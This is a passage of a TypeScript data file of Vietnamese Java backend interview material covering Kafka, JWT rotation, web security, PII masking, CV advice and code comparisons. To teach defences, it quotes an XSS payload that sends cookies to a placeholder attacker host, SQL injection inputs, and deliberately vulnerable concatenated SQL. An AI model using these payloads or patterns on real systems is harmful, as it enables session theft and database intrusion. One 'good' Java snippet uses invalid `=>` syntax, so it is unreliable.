        goodCodeTitle: '✅ Cấu hình DefaultErrorHandler với DeadLetterPublishingRecoverer',
        goodCode: `@Configuration
public class KafkaConsumerConfig {

    @Bean
    public CommonErrorHandler errorHandler(KafkaTemplate<Object, Object> template) {
        // 1. Khởi tạo Recoverer: Đẩy tin nhắn lỗi sang topic hậu tố .DLT:
        DeadLetterPublishingRecoverer recoverer = new DeadLetterPublishingRecoverer(template,
                (record, ex) -> new TopicPartition(record.topic() + ".DLT", record.partition()));

        // 2. Thử lại tối đa 3 lần, mỗi lần cách nhau 2 giây (FixedBackOff):
        DefaultErrorHandler errorHandler = new DefaultErrorHandler(recoverer, new FixedBackOff(2000L, 3));

        // 3. Không retry cho các lỗi vô vọng (ví dụ sai format cú pháp JSON chắc chắn retry cũng hỏng):
        errorHandler.addNotRetryableExceptions(DeserializationException.class, IllegalArgumentException.class);

        return errorHandler;
    }
}

// Consumer lắng nghe topic DLT để cảnh báo hoặc can thiệp thủ công:
@KafkaListener(topics = "orders.DLT", groupId = "ops-alert-group")
public void handlePoisonPill(ConsumerRecord<String, Object> record) {
    log.error("CẢNH BÁO: Phát hiện Poison Message tại offset={} | payload={}", record.offset(), record.value());
    alertService.notifySlackChannel("Phát hiện message lỗi trong DLT cần kiểm tra!");
}`,
        interviewTip: 'Khi phỏng vấn được hỏi: "Làm thế nào để giám sát và xử lý khi Consumer Lag tăng đột biến?", hãy trả lời: "Em dùng Prometheus và Grafana để alert khi Consumer Lag vượt ngưỡng. Bước 1: Kiểm tra log xem có dính Poison Pill hay không (nếu có thì điều hướng sang DLT). Bước 2: Nếu do tải quá lớn, tăng số lượng Partition và tăng số lượng Pod Consumer tương ứng để nhân bản tốc độ xử lý song song".'
      },
      {
        id: 'kafka-partition-ordering',
        title: '3. Đảm Bảo Thứ Tự Thông Điệp & Nghệ Thuật Chọn Partitioning Key',
        badge: 'Bản Chất Kiến Trúc',
        summary: 'Kafka chỉ cam kết thứ tự trong CÙNG 1 PARTITION, không cam kết toàn Topic. Luôn truyền Partition Key (như orderId) để sự kiện không bị đảo lộn.',
        explanation: `Một hiểu lầm rất phổ biến: "Kafka đảm bảo thứ tự tin nhắn theo thời gian (FIFO) trên toàn bộ Topic".
**Sự thật phũ phàng:** Kafka **CHỈ ĐẢM BẢO THỨ TỰ TRONG NỘI BỘ TỪNG PARTITION DUY NHẤT**!

**Thảm họa khi không truyền Partition Key:**
- Giả sử Topic \`order-events\` có 3 Partitions ($P_0, P_1, P_2$).
- Một đơn hàng ID = 99 có chuỗi sự kiện nghiệp vụ:
  1. \`ORDER_CREATED\` (Lúc 10:00:00)
  2. \`ORDER_PAID\` (Lúc 10:00:05)
  3. \`ORDER_CANCELLED\` (Lúc 10:00:10)
- Nếu Producer không gửi kèm Key, Kafka sẽ dùng chiến lược Round-Robin:
  - Sự kiện 1 bay vào $P_0$.
  - Sự kiện 2 bay vào $P_1$.
  - Sự kiện 3 bay vào $P_2$.
- Khi 3 Consumer độc lập đọc từ 3 Partition này, Consumer của $P_2$ có thể chạy nhanh hơn và xử lý \`ORDER_CANCELLED\` trước cả khi \`ORDER_CREATED\` được tạo trong Database! Hậu quả: Dữ liệu bị vỡ nát!

**Quy tắc vàng: Luôn dùng Business Key làm Partition Key**
- Khi gọi: \`kafkaTemplate.send("order-events", orderId.toString(), eventPayload);\`.
- Kafka sử dụng thuật toán băm **Murmur2** trên Partition Key:
  \`Partition = murmur2(key) % totalPartitions\`.
- Tất cả các sự kiện có cùng một \`orderId\` sẽ luôn luôn được băm vào **chính xác cùng một Partition duy nhất**!
- Nhờ đó, chúng sẽ được đọc và xử lý theo đúng tuần tự thời gian 100% không bao giờ bị đảo lộn!`,
        badCodeTitle: '❌ Gửi message không có Key khiến sự kiện bị xáo trộn',
        badCode: `@Service
public class BadOrderProducer {
    @Autowired private KafkaTemplate<String, Object> kafkaTemplate;

    public void publishEvent(OrderEvent event) {
        // ❌ GỬI KHÔNG CÓ KEY: Message bị chia đều ngẫu nhiên sang các partition khác nhau!
        // Sự kiện "CANCEL" có thể bị xử lý trước sự kiện "CREATE"!
        kafkaTemplate.send("order-events", event);
    }
}`,
        goodCodeTitle: '✅ Luôn chỉ định Partition Key nhất quán theo nghiệp vụ',
        goodCode: `@Service
@RequiredArgsConstructor
public class SafeOrderProducer {
    private final KafkaTemplate<String, OrderEvent> kafkaTemplate;

    public void publishOrderLifecycleEvent(OrderEvent event) {
        // ✅ TRUYỀN ORDER_ID LÀM KEY:
        // Đảm bảo 100% tất cả sự kiện của cùng 1 đơn hàng luôn vào đúng 1 Partition!
        String partitionKey = String.valueOf(event.orderId());

        kafkaTemplate.send("order-events", partitionKey, event)
            .whenComplete((result, ex) -> {
                if (ex != null) {
                    log.error("Gửi event thất bại cho orderId={}", event.orderId(), ex);
                } else {
                    log.info("Message vào partition={} | offset={}", 
                        result.getRecordMetadata().partition(), 
                        result.getRecordMetadata().offset());
                }
            });
    }
}`,
        interviewTip: 'Câu hỏi bẫy phỏng vấn: "Điều gì xảy ra nếu ta tăng số lượng Partition của một Topic đang chạy trên Production?". Trả lời: "Thuật toán murmur2(key) % new_partitions sẽ ra kết quả partition khác với trước đó! Các message mới của cùng 1 orderId có thể bị chuyển sang partition khác, làm mất tính bảo đảm thứ tự với các message cũ chưa tiêu thụ hết. Vì vậy, tăng partition cần phải lên kế hoạch xả cạn consumer lag hoặc dùng custom partitioner".'
      }
    ]
  },
  {
    id: 'security-auth-mastery',
    title: 'Bảo Mật Ứng Dụng & Authentication/Authorization',
    icon: '🔒',
    accentColor: '#eab308',
    tagline: 'Bảo vệ hệ thống trước OWASP Top 10, phân quyền RBAC/ABAC, JWT Refresh Token Rotation và mã hóa dữ liệu nhạy cảm',
    topics: [
      {
        id: 'jwt-refresh-token-rotation',
        title: '1. Refresh Token Rotation (RTR): Chống Đánh Cắp Session & Token Replay',
        badge: 'Chuẩn Bảo Mật OAuth2',
        summary: 'Access Token sống ngắn (15 phút), Refresh Token sống dài (7 ngày). Mỗi lần cấp Access Token mới, Refresh Token cũ bị HỦY ngay lập tức.',
        explanation: `Trong kiến trúc hiện đại, **JSON Web Token (JWT)** là chuẩn xác thực phổ biến nhất. Nhưng JWT là cơ chế không trạng thái (Stateless): một khi token đã được ký, **server không thể thu hồi token đó trước hạn** trừ khi duy trì Blacklist tốn kém trong Redis!

**Mô hình 2 Token chuẩn mực:**
- **Access Token:** Sống cực ngắn (5 đến 15 phút). Dùng để gọi API hàng ngày. Nếu chẳng may bị lộ thì thiệt hại cũng chỉ kéo dài tối đa 15 phút.
- **Refresh Token:** Sống dài (7 đến 30 ngày). Chỉ dùng đúng một việc duy nhất: Gửi lên endpoint \`/auth/refresh\` để xin cấp cặp token mới.

**Hiểm họa khi dùng Refresh Token tĩnh:**
Nếu hacker đánh cắp được Refresh Token từ máy nạn nhân, hacker có thể liên tục xin Access Token mới và duy trì quyền đăng nhập vĩnh viễn!

**Giải pháp: Refresh Token Rotation (RTR) & Phát hiện xâm nhập (Reuse Detection)**
1. Khi Client gửi Refresh Token $RT_1$ lên để xin token mới:
   - Server kiểm tra $RT_1$ có hợp lệ không.
   - Server lập tức **ĐÁNH DẤU $RT_1$ LÀ ĐÃ SỬ DỤNG (REVOKED)**.
   - Server cấp lại cặp mới toanh: $(AT_2, RT_2)$.
2. **Cơ chế Automatic Reuse Detection:**
   - Nếu hacker dùng lại token $RT_1$ cũ đã bị hủy để xin cấp tiếp ➔ Server nhận diện ngay có hành vi tấn công Replay Attack!
   - **Hành động tức thì:** Server **LẬP TỨC THU HỒI TOÀN BỘ GIA ĐÌNH TOKEN (TOKEN FAMILY)** của tài khoản đó, buộc cả người dùng thật lẫn hacker phải đăng nhập lại từ đầu bằng mật khẩu!`,
        asciiDiagram: `[Client Bình Thường] ──(1. Gửi RT-1)──> [Auth Server]
                                          ├── 2. Hủy RT-1 (Revoke) ✅
                                          └── 3. Cấp cặp mới (AT-2, RT-2) ➔ [Client lưu RT-2]

[Hacker Dùng Lại RT-1] ──(Gửi RT-1 cũ)──> [Auth Server]
                                          ├── Phát hiện RT-1 ĐÃ BỊ HỦY! ⚠️
                                          ├── BÁO ĐỘNG: Token Replay Attack! 🚨
                                          └── THU HỒI TOÀN BỘ Session của User (Đá văng cả 2)!`,
        badCodeTitle: '❌ Refresh Token dùng mãi không đổi và lưu LocalStorage',
        badCode: `// ❌ LỖI 1: Lưu Access/Refresh Token trong LocalStorage -> Dễ dàng bị đánh cắp bởi mã độc XSS!
localStorage.setItem("refreshToken", token);

// ❌ LỖI 2: Dùng Refresh Token cấp Access Token mới nhưng giữ nguyên Refresh Token cũ:
@PostMapping("/refresh")
public AuthResponse refresh(@RequestBody String oldRefreshToken) {
    // Không đổi Refresh Token -> Hacker giữ được token là sở hữu tài khoản vĩnh viễn!
    return new AuthResponse(generateAccessToken(userId), oldRefreshToken);
}`,
        goodCodeTitle: '✅ Refresh Token Rotation & Lưu trữ trong HttpOnly Cookie',
        goodCode: `@PostMapping("/refresh")
public ResponseEntity<TokenResponse> refreshToken(HttpServletRequest request, HttpServletResponse response) {
    // 1. Đọc Refresh Token từ HttpOnly Cookie (JavaScript không thể đọc trộm -> Miễn nhiễm XSS):
    String refreshToken = extractTokenFromCookie(request);

    // 2. Xác thực và áp dụng cơ chế Rotation:
    TokenFamily family = tokenService.validateAndRotate(refreshToken);
    if (family.isReused()) {
        // PHÁT HIỆN DÙNG LẠI: Thu hồi toàn bộ session của tài khoản ngay lập tức!
        tokenService.revokeAllSessions(family.getUserId());
        throw new SecurityException("Phát hiện hành vi gian lận token! Toàn bộ phiên đăng nhập đã bị hủy.");
    }

    // 3. Cấp cặp token mới:
    String newAccessToken = tokenService.createAccessToken(family.getUserId());
    String newRefreshToken = tokenService.createRefreshToken(family);

    // 4. Ghi đè Refresh Token mới vào HttpOnly Secure Cookie:
    ResponseCookie cookie = ResponseCookie.from("refreshToken", newRefreshToken)
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .path("/api/v1/auth")
            .maxAge(Duration.ofDays(7))
            .build();
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    return ResponseEntity.ok(new TokenResponse(newAccessToken));
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Nên lưu JWT ở đâu trên Frontend: LocalStorage hay Cookie?", hãy trả lời ngay: "Không bao giờ lưu Refresh Token trong LocalStorage vì nó dễ bị đánh cắp qua lỗ hổng XSS. Chuẩn an toàn nhất là lưu Access Token trong bộ nhớ RAM của ứng dụng (hoặc Closure), còn Refresh Token được lưu trong Cookie có cờ HttpOnly, Secure và SameSite=Strict để trình duyệt tự quản lý an toàn tuyệt đối".'
      },
      {
        id: 'sql-injection-xss-csrf',
        title: '2. Phòng Chống Tam Đại Lỗ Hổng Web: SQLi, XSS & CSRF Trong Spring Boot',
        badge: 'OWASP Top 10 Sống Còn',
        summary: 'SQLi -> Parameterized Queries; XSS -> Content-Security-Policy & Escape HTML; CSRF -> SameSite Cookie & CSRF Token.',
        explanation: `3 lỗ hổng bảo mật kinh điển nhất trong các ứng dụng web mà bất kỳ lập trình viên nào cũng phải thuộc lòng cách phòng chống:

**1. SQL Injection (SQLi):**
- Hacker chèn các ký tự SQL đặc biệt (\`' OR 1=1 --\`) vào ô tìm kiếm hoặc tham số URL để bẻ gãy câu truy vấn và đọc trộm toàn bộ database.
- **Phòng chống:** Tuyệt đối không nối chuỗi SQL thủ công! Luôn dùng **Parameterized Queries** (\`PreparedStatement\`, Spring Data JPA với dấu \`:param\`).

**2. Cross-Site Scripting (XSS):**
- Hacker gửi đoạn mã JavaScript độc hại (ví dụ: \`<script>fetch('http://hacker.com?stolen=' + document.cookie)</script>\`) vào phần bình luận hoặc tên người dùng. Khi người khác xem trang đó, trình duyệt tự động thực thi đoạn script này.
- **Phòng chống:**
  - Escape toàn bộ HTML đầu ra (React/Angular tự động escape mặc định).
  - Cấu hình header **Content-Security-Policy (CSP)** để cấm trình duyệt thực thi inline script từ các nguồn lạ.
  - Lưu token trong \`HttpOnly Cookie\` để JavaScript bị vô hiệu hóa khi cố đọc \`document.cookie\`.

**3. Cross-Site Request Forgery (CSRF):**
- Hacker lừa nạn nhân bấm vào một đường link độc hại trong khi nạn nhân vẫn đang giữ phiên đăng nhập ở trang ngân hàng. Trình duyệt tự động gửi kèm Session Cookie tới ngân hàng để thực hiện lệnh chuyển tiền!
- **Phòng chống:** Cấu hình thuộc tính \`SameSite=Strict\` trên Cookie và kiểm tra CSRF Token cho các ứng dụng web dạng Server-Side Rendering (Thymeleaf/JSP).`,
        badCodeTitle: '❌ Nối chuỗi SQL và tắt CSRF bừa bãi',
        badCode: `// ❌ LỖI SQLi CHẾT NGƯỜI: Nối chuỗi thô trong câu lệnh SQL:
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
// Nếu username = "admin' --", hacker đăng nhập thành công không cần mật khẩu!

// ❌ Tắt CSRF vô tội vạ trong Spring Security mà không hiểu bản chất:
http.csrf(AbstractHttpConfigurer::disable); // Nguy hiểm nếu dùng Session Cookie!`,
        goodCodeTitle: '✅ Parameterized Query & Spring Security 6 cấu hình chuẩn',
        goodCode: `// ✅ 1. Dùng Named Parameters trong Spring Data JPA chống 100% SQLi:
public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.username = :username AND u.status = :status")
    Optional<User> findActiveUser(@Param("username") String username, @Param("status") String status);
}

// ✅ 2. Cấu hình Spring Security 6 chuẩn mực cho REST API:
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            // Với Stateless REST API dùng Bearer Token trong Header, ta có thể tắt CSRF an toàn:
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .headers(headers -> headers
                // Bật Content-Security-Policy chống XSS:
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
                // Chống Clickjacking:
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/v1/public/**", "/api/v1/auth/**").permitAll()
                .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .build();
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Tại sao trong các tutorial Spring Boot người ta hay viết csrf.disable()?", hãy trả lời: "Vì CSRF chỉ nguy hiểm khi hệ thống dùng Cookie để xác thực người dùng (trình duyệt tự động đính kèm Cookie trong cross-site request). Đối với Stateless REST API dùng Authorization Header (Bearer JWT), trình duyệt không tự đính kèm header này nên CSRF không thể tấn công được, do đó ta có thể disable CSRF để đơn giản hóa kiến trúc".'
      },
      {
        id: 'data-masking-audit',
        title: '3. Bảo Vệ Dữ Liệu Cá Nhân (PII Masking) & Dấu Vết Kiểm Toán (Audit Trail)',
        badge: 'Tuân Thủ Pháp Lý',
        summary: 'Tuyệt đối cấm in số thẻ tín dụng, mật khẩu, CCCD dạng thô ra log. Tự động che mờ (Masking) và ghi nhận Audit Log ai đã sửa gì.',
        explanation: `Trong các dự án doanh nghiệp, đặc biệt là Fintech, Ngân hàng, Y tế và Thương mại điện tử:
Tuân thủ các tiêu chuẩn bảo mật như **PCI-DSS** (thẻ thanh toán) và **GDPR / Nghị định 13** (bảo vệ dữ liệu cá nhân) là bắt buộc.

**1. PII Masking (Che mờ dữ liệu cá nhân nhạy cảm):**
- **Thông tin PII gồm:** Số thẻ tín dụng, mật khẩu, số CMND/CCCD, email, số điện thoại.
- **Quy tắc vàng:** **TUYỆT ĐỐI KHÔNG BAO GIỜ GHI PII DẠNG RÕ (PLAINTEXT) RA FILE LOG HOẶC MÀN HÌNH!**
- Nếu một lập trình viên vô tình log toàn bộ \`userRequest\` chứa số thẻ tín dụng, file log được đẩy lên Elasticsearch/Datadog và hàng trăm người trong công ty có thể nhìn thấy ➔ Công ty sẽ bị tước giấy phép hoạt động và bị phạt hàng triệu USD!
- Định dạng che mờ chuẩn:
  - Số thẻ: \`4111-XXXX-XXXX-1111\` (chỉ giữ 4 số đầu và 4 số cuối).
  - Số điện thoại: \`0987***321\`.
  - Email: \`k*****@gmail.com\`.

**2. Audit Trail (Dấu vết kiểm toán):**
- Khi xảy ra tranh chấp hoặc nghi ngờ gian lận nội bộ (ví dụ: một nhân viên tự ý tăng hạn mức tín dụng cho người quen):
- Hệ thống bắt buộc phải trả lời được chính xác 4 câu hỏi:
  1. **Ai** là người thực hiện thay đổi (\`created_by\`, \`modified_by\`)?
  2. **Thời điểm nào** (\`created_at\`, \`modified_at\`)?
  3. **Địa chỉ IP** và nguồn gốc request từ đâu?
  4. **Giá trị trước và sau khi thay đổi (Old Value vs New Value)** là gì?
- Công cụ: Sử dụng **Spring Data JPA Auditing** kết hợp **Hibernate Envers** để tự động lưu lịch sử thay đổi vào bảng \`_AUD\` riêng biệt.`,
        badCodeTitle: '❌ Log toàn bộ dữ liệu thẻ thô vi phạm chuẩn PCI-DSS',
        badCode: `@PostMapping("/pay")
public ResponseEntity<?> processPayment(@RequestBody PaymentRequest req) {
    // ❌ THẢM HỌA BẢO MẬT: In trần trụi số thẻ và mã CVV ra log hệ thống!
    log.info("Xử lý thanh toán cho request: {}", req);
    // Log ghi lại: PaymentRequest[cardNumber=4532123456789012, cvv=888, pin=1234] -> Vi phạm pháp luật!
}`,
        goodCodeTitle: '✅ Tự động che PII bằng Jackson Serializer & JPA Auditing',
        goodCode: `// ✅ 1. DTO tự động che mờ thông tin nhạy cảm khi serialize/log:
public record PaymentRequest(
    String accountHolder,
    @JsonSerialize(using = CardNumberMaskSerializer.class)
    String cardNumber,
    @JsonIgnore // CVV tuyệt đối không lưu và không serialize ra log!
    String cvv
) {
    // Custom toString() che mờ để log an toàn:
    @Override
    public String toString() {
        return "PaymentRequest[holder=" + accountHolder + ", card=" + maskCard(cardNumber) + "]";
    }

    private static String maskCard(String num) {
        if (num == null || num.length() < 8) return "****";
        return num.substring(0, 4) + "-XXXX-XXXX-" + num.substring(num.length() - 4);
    }
}

// ✅ 2. Kích hoạt JPA Auditing tự động lưu vết ai đã sửa dữ liệu:
@Entity
@EntityListeners(AuditingEntityListener.class)
public class Account {
    @Id private Long id;
    private BigDecimal balance;

    @CreatedBy
    @Column(updatable = false)
    private String createdBy;

    @LastModifiedDate
    private Instant lastModifiedDate;

    @LastModifiedBy
    private String lastModifiedBy; // Tự động lấy username từ Spring SecurityContext!
}`,
        interviewTip: 'Người phỏng vấn hỏi: "Tại sao không nên băm (hash) mật khẩu bằng MD5 hay SHA-256?". Hãy trả lời: "MD5 và SHA-256 là các thuật toán tính toán quá nhanh (hàng tỷ phép tính/giây trên GPU), rất dễ bị bẻ khóa bằng Rainbow Table hoặc Brute-force. Mật khẩu bắt buộc phải được băm bằng các thuật toán Key Derivation Function chậm rãi và có Salt ngẫu nhiên như BCrypt, PBKDF2 hoặc Argon2 để chống tấn công phần cứng chuyên dụng".'
      }
    ]
  }
];

// ==========================================
// 2. DATA: CV & JOB HUNTING STRATEGY
// ==========================================

interface CvSectionBreakdown {
  sectionTitle: string;
  doThis: string[];
  dontDoThis: string[];
  exampleText: string;
}

const CV_SECTIONS: CvSectionBreakdown[] = [
  {
    sectionTitle: '1. Mô Tả Dự Án Cá Nhân (Project Experience)',
    doThis: [
      'Áp dụng công thức Google XYZ: Đạt được [X], đo lường bằng [Y], bằng cách làm [Z].',
      'Đính kèm đường dẫn GitHub repo có commit đều đặn và tài liệu Swagger/Postman API rõ ràng.',
      'Nêu rõ các thách thức kỹ thuật bạn đã trực tiếp giải quyết (N+1 query, JWT security, Redis cache).'
    ],
    dontDoThis: [
      'Ghi dự án Todo App, Quản lý sinh viên console đơn giản sao chép trên mạng.',
      'Chỉ liệt kê công nghệ dạng danh sách: "Java, Spring, MySQL" mà không nói dùng để làm gì.',
      'Viết chung chung: "Làm chức năng đăng nhập và thanh toán".'
    ],
    exampleText: '✅ "Xây dựng hệ thống E-commerce Backend phục vụ 500+ SKU; thiết kế RESTful API chuẩn RFC 7807; tối ưu hóa thời gian phản hồi API danh sách đơn hàng giảm 60% (từ 700ms xuống 280ms) bằng cách xử lý N+1 Query với JOIN FETCH và thiết lập B-Tree Index trên PostgreSQL; viết 25+ Unit & Integration Tests đạt 82% Code Coverage."'
  },
  {
    sectionTitle: '2. Kỹ Năng Kỹ Thuật (Technical Skills)',
    doThis: [
      'Phân nhóm chuyên nghiệp: Languages (Java 17/21, SQL), Frameworks (Spring Boot 3, Spring Data JPA), Tools (Docker, Git, Maven, Postman), Testing (JUnit 5, Mockito).',
      'Chỉ ghi những công nghệ bạn thực sự hiểu bản chất và có thể trả lời khi bị phỏng vấn đào sâu.'
    ],
    dontDoThis: [
      'Vẽ thanh phần trăm (%): "Java 85%, Spring 70%" (Hoàn toàn vô nghĩa và bị trừ điểm).',
      'Nhồi nhét từ khóa đao to búa lớn (Kafka, Kubernetes, Microservices, CI/CD) khi chỉ mới đọc lướt qua lý thuyết.'
    ],
    exampleText: '✅ Languages: Java (17/21), SQL (PostgreSQL, MySQL)\nFrameworks & Libraries: Spring Boot 3, Spring Data JPA, Spring Security (JWT), Hibernate, Lombok\nTesting: JUnit 5, Mockito, MockMvc\nDevOps & Tools: Docker, Docker Compose, Git, Maven, Postman, IntelliJ IDEA'
  }
];

interface CodeBattle {
  id: string;
  title: string;
  category: string;
  impactBadge: string;
  badTitle: string;
  badCode: string;
  badExplanation: string;
  goodTitle: string;
  goodCode: string;
  goodExplanation: string;
}

const CODE_BATTLES: CodeBattle[] = [
  {
    id: 'bouncer-pattern',
    title: '1. Bouncer Pattern (Guard Clauses)',
    category: 'Clean Code',
    impactBadge: 'Dễ đọc & Giảm 80% độ phức tạp',
    badTitle: '❌ Thói quen ở trường (Pyramid of Doom - Tháp if-else lồng nhau)',
    badCode: `public void processOrder(OrderRequest req) {
    if (req != null) {
        if (req.getItems() != null && !req.getItems().isEmpty()) {
            User user = userRepo.findById(req.getUserId()).orElse(null);
            if (user != null) {
                if (user.isActive()) {
                    if (inventoryService.checkStock(req.getItems())) {
                        // Logic nghiệp vụ chính bị thụt lề 5-6 tầng!
                        paymentService.charge(user, req.getTotal());
                        orderRepo.save(new Order(user, req));
                    }
                }
            }
        }
    }
}`,
    badExplanation: 'Anti-pattern Kim tự tháp: Logic cốt lõi bị giấu sâu trong nhiều lớp ngoặc nhọn. Khi cần thêm logic kiểm tra mới, code sẽ phình to sang bên phải, cực kỳ dễ sót bug và khó viết unit test.',
    goodTitle: '✅ Chuẩn đi làm (Bouncer Pattern / Fail-Fast Guard Clauses)',
    goodCode: `public void processOrder(OrderRequest req) {
    // 1. Chặn ngay các trường hợp sai lệch ở cổng (Bouncers)
    if (req == null || req.getItems() == null || req.getItems().isEmpty()) {
        throw new InvalidRequestException("Đơn hàng rỗng hoặc không hợp lệ");
    }
    User user = userRepo.findById(req.getUserId())
        .orElseThrow(() => new ResourceNotFoundException("User không tồn tại"));

    if (!user.isActive()) {
        throw new UserSuspendedException("Tài khoản đã bị tạm khóa");
    }
    if (!inventoryService.checkStock(req.getItems())) {
        throw new OutOfStockException("Sản phẩm đã hết hàng trong kho");
    }

    // 2. Happy Path (luồng thành công) nằm phẳng 100% ở ngoài cùng!
    paymentService.charge(user, req.getTotal());
    orderRepo.save(new Order(user, req));
}`,
    goodExplanation: 'Bouncer Pattern kiểm tra điều kiện lỗi và return hoặc ném exception ngay ở đầu method. Toàn bộ logic chính nằm phẳng phiu ở ngoài cùng, trực quan và dễ đọc như một bản danh sách việc cần làm.'
  },
  {
    id: 'constructor-vs-field',
    title: '2. Constructor Injection vs Field Injection',
    category: 'Spring Boot',
    impactBadge: 'Bất biến & Dễ viết Unit Test',
    badTitle: '❌ Thói quen ở trường (@Autowired trực tiếp lên Field)',
    badCode: `@Service
public class OrderService {
    @Autowired
    private OrderRepository orderRepo; // Field Injection

    @Autowired
    private PaymentService paymentService;

    // Khi viết Unit Test: BẮT BUỘC phải bật Spring Context nặng nề
    // hoặc dùng ReflectionTestUtils để gán giá trị!
}`,
    badExplanation: 'Field Injection phá vỡ tính đóng gói của OOP, không thể khai báo biến final (mất tính bất biến), và khiến việc viết Unit Test thuần túy bằng new OrderService(mockRepo) trở nên bất khả thi.',
    goodTitle: '✅ Chuẩn đi làm (Constructor Injection + Lombok)',
    goodCode: `@Service
@RequiredArgsConstructor // Lombok tự sinh constructor cho tất cả các field final
public class OrderService {
    private final OrderRepository orderRepo;     // Bất biến, an toàn tuyệt đối
    private final PaymentService paymentService;

    // Khi viết Unit Test: Chỉ cần new thuần túy trong 1 mili-giây:
    // OrderService service = new OrderService(mockRepo, mockPayment);
}`,
    goodExplanation: 'Constructor Injection đảm bảo dependency không thể bị null sau khi khởi tạo, cho phép đánh dấu final, và phát hiện lỗi phụ thuộc vòng (Circular Dependency) ngay khi ứng dụng khởi động (Fail-fast).'
  },
  {
    id: 'n-plus-1-join-fetch',
    title: '3. N+1 Query vs JOIN FETCH',
    category: 'Database / JPA',
    impactBadge: 'Tăng tốc API gấp 10-50 lần',
    badTitle: '❌ Thói quen ở trường (1 Query lấy Cha + N Queries lấy Con)',
    badCode: `// Sinh ra: 1 SELECT bảng User + 100 SELECT bảng Order riêng biệt!
List<User> users = userRepository.findAll();
for (User user : users) {
    // Mỗi lần gọi getOrders() là 1 lần gửi query SQL mới xuống DB
    System.out.println(user.getName() + ": " + user.getOrders().size());
}`,
    badExplanation: 'Với 1,000 user, hệ thống bắn 1,001 câu truy vấn xuống Database, chiếm dụng toàn bộ connection pool của HikariCP và khiến API mất hàng giây phản hồi.',
    goodTitle: '✅ Chuẩn đi làm (JOIN FETCH gom trong 1 câu SQL)',
    goodCode: `public interface UserRepository extends JpaRepository<User, Long> {
    // Đúng 1 câu query SQL duy nhất với LEFT JOIN
    @Query("SELECT DISTINCT u FROM User u LEFT JOIN FETCH u.orders")
    List<User> findAllWithOrders();
}

// Service sử dụng mượt mà, không sinh thêm bất kỳ câu SQL nào:
List<User> users = userRepository.findAllWithOrders();
for (User user : users) {
    System.out.println(user.getName() + ": " + user.getOrders().size());
}`,
    goodExplanation: 'JOIN FETCH chỉ thị cho Hibernate nạp sẵn toàn bộ danh sách con ngay trong câu query ban đầu. Số lượng round-trip mạng tới DB giảm từ N+1 xuống đúng 1 lần duy nhất.'
  },
  {
    id: 'dto-vs-entity',
    title: '4. DTO Response vs Lộ Hibernate Entity',
    category: 'RESTful API',
    impactBadge: 'Bảo mật dữ liệu & Tránh vòng lặp JSON',
    badTitle: '❌ Thói quen ở trường (Trả trực tiếp Entity ra Controller)',
    badCode: `@RestController
@RequestMapping("/api/users")
public class UserController {
    @GetMapping("/{id}")
    public User getUser(@PathVariable Long id) {
        // Trả thẳng Entity ra JSON: Lộ password_hash, token, secret!
        // Dễ bị lỗi lặp vô tận: JsonMappingException (Lazy Loading circular ref)
        return userRepository.findById(id).orElseThrow();
    }
}`,
    badExplanation: 'Lộ cấu trúc bảng cơ sở dữ liệu nội bộ ra ngoài thế giới. Khách hàng hoặc hacker có thể nhìn thấy các cột nhạy cảm như hashed password, salt, và lịch sử xóa mềm.',
    goodTitle: '✅ Chuẩn đi làm (Tách biệt DTO Request / Response)',
    goodCode: `// DTO bất biến, chỉ chứa dữ liệu cần hiển thị cho Client
public record UserResponseDto(
    Long id,
    String fullName,
    String email,
    Instant createdAt
) {
    public static UserResponseDto from(User u) {
        return new UserResponseDto(u.getId(), u.getFullName(), u.getEmail(), u.getCreatedAt());
    }
}

@GetMapping("/{id}")
public ResponseEntity<UserResponseDto> getUser(@PathVariable Long id) {
    return ResponseEntity.ok(userService.getUserResponse(id));
}`,
    goodExplanation: 'Record DTO (Java 16+) giúp bảo vệ cấu trúc Database, ngăn chặn tấn công Over-Posting / Mass Assignment, và loại bỏ hoàn toàn lỗi tuần tự hóa JSON của Hibernate.'
  },
  {
    id: 'slf4j-vs-sout',
    title: '5. SLF4J Parameterized Logging vs System.out',
    category: 'Logging & Ops',
    impactBadge: 'Non-blocking I/O & Có Trace Context',
    badTitle: '❌ Thói quen ở trường (System.out.println & printStackTrace)',
    badCode: `try {
    paymentService.charge(order);
} catch (Exception e) {
    System.out.println("Lỗi thanh toán: " + e.getMessage());
    e.printStackTrace(); // Gây nghẽn luồng I/O console, mất log khi deploy Docker!
}`,
    badExplanation: 'System.out.println là hàm đồng bộ (Synchronous I/O) có khóa luồng (synchronized). Khi hệ thống có tải cao, các thread phải xếp hàng chờ ghi console, làm tê liệt hiệu năng.',
    goodTitle: '✅ Chuẩn đi làm (SLF4J + Parameterized Placeholders)',
    goodCode: `@Slf4j
@Service
public class OrderService {
    public void processPayment(Order order) {
        try {
            paymentService.charge(order);
            log.info("Thanh toán thành công | orderId={} | amount={}", order.getId(), order.getTotal());
        } catch (PaymentException ex) {
            log.error("Thanh toán thất bại | orderId={} | errorCode={}", order.getId(), ex.getErrorCode(), ex);
            throw ex;
        }
    }
}`,
    goodExplanation: 'SLF4J dùng cú pháp {} giúp JVM không phải tốn bộ nhớ nối chuỗi String nếu log level chưa được bật. Log được ghi bất đồng bộ (Async Appender) sang file có phân cấp rolling và traceId.'
  },
  {
    id: 'global-exception-vs-null',
    title: '6. @RestControllerAdvice vs Nuốt lỗi / Trả null',
    category: 'Clean Code',
    impactBadge: 'Chuẩn hóa RFC 7807 & Xóa sổ NullPointer',
    badTitle: '❌ Thói quen ở trường (Nuốt ngoại lệ hoặc return null/string linh tinh)',
    badCode: `@GetMapping("/user/{id}")
public Map<String, Object> getUser(@PathVariable Long id) {
    Map<String, Object> res = new HashMap<>();
